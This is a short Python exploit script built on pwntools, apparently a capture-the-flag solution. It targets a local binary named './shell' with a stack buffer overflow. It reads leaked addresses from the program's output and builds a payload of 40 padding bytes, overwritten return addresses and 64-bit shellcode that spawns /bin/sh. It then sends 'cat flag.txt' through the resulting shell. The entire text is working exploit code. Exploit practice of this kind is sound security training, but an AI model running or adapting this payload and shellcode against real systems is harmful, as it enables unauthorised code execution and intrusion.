from pwn import *

# Define the host and port

# Establish remote connection
# conn = remote('localhost', 2000)
conn = process('./shell')

# Receive feedback from the server
data = conn.recv(1024).decode()
print("Feedback from server:", data)

# Extract return addresses
ret_addr2 = int(data[-11:-2], 16)
ret_addr1 = int(data[-15:-11], 16)

print(hex(ret_addr1))
print(hex(ret_addr2))

ret_addr2 = p32(ret_addr2 + 48)
ret_addr1 = p32(ret_addr1)

# Shellcode (64-bit)
shellcode64 = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

# Construct payload
payload = b"A" * 40 + ret_addr2 + ret_addr1 + shellcode64 + b"\x00"

# Send payload
conn.send(payload)
conn.send(b"\n")

# Receive and print response
data = conn.recv(1024)
print("Feedback from server:", data)

# Send command to read flag
conn.send(b"cat flag.txt\n")

# Receive and print flag
data = conn.recv(1024)
print("Feedback from server:", data.decode())

# Close connection
conn.close()

